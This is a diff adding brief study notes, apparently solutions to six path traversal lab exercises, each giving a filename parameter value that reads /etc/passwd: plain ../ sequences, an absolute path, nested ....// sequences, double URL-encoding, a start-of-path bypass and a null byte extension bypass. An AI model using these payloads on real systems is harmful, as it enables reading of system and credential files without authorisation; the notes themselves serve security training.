@@ -1,0 +1,27 @@
+1. File path traversal, simple case
+	
+	?filename=/var/www/images/../../../etc/passw
+	Modify the filename parameter, giving it the value ../../../etc/passwd
+
+2. File path traversal, traversal sequences blocked with absolute path bypass
+
+	/etc/passwd overserve that the response contains the contents of the file	
+
+3. File path traversal, traversal sequences stripped non-recursively
+
+	 Modify the filename parameter, giving it the value: ....//....//....//etc/passwd 
+
+4. File path traversal, traversal sequences stripped with superfluous URL-decode
+
+	decode in url one time or two times or more here slash (/) has decoded for two times
+	..%252f..%252f..%252fetc/passwd.
+
+5. File path traversal, validation of start of path
+
+	here if observe the filename path closly we can notice that file path has already give so
+	only use the /
+	Modify the filename parameter, giving it the value /var/www/images/../../../etc/passwd. 
+
+6. File path traversal, validation of file extension with null byte bypass
+
+	 Modify the filename parameter, giving it the value ../../../etc/passwd%00.png.
